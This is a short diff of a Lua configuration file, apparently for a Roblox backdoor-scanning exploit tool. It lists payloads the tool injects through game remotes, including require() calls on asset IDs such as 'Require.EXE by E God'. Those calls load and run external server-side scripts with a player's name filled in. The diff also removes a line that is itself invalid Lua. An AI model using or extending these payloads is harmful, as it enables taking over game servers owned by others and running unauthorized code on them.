@@ -18,7 +18,7 @@ return {
 		[[require(5196668511)(%username%)]],
 		[[require(125992639027440)["Require.EXE by E God"](%username%)]],
 		[[print("Heheheheh. umm *splashes all over table*")]],
-		[[print(%remote%)]],
+		[[print(%backdoorRem%)]],
 	},
 
 	-- Remote filters that you don't want to be scanned
@@ -61,7 +61,6 @@ return {
 		["username"] = player.Name,
 		["userid"] = player.UserId,
 		["placeid"] = game.PlaceId,
-		["remote"] = remoteObjPath = remoteObj:GetFullName(),
 	},
 
 	["backdoorPayloads"] = {
